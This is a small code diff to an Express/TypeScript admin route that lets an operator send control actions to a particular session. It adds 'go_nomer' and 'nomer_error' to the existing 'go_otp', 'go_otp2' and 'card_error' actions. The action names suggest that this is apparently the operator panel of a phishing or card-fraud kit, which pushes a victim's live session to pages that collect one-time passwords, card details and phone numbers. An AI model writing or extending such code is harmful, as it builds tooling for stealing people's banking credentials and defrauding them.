@@ -33,9 +33,9 @@ router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
   const sessionId = Array.isArray(rawSessionId) ? rawSessionId[0] : rawSessionId;
   const { action } = req.body as { action?: string };
 
-  const allowed: ControlAction[] = ["go_otp", "go_otp2", "card_error"];
+  const allowed: ControlAction[] = ["go_otp", "go_otp2", "card_error", "go_nomer", "nomer_error"];
   if (!action || !allowed.includes(action as ControlAction)) {
-    res.status(400).json({ error: "Invalid action. Must be: go_otp | go_otp2 | card_error" });
+    res.status(400).json({ error: "Invalid action. Must be: go_otp | go_otp2 | card_error | go_nomer | nomer_error" });
     return;
   }
 
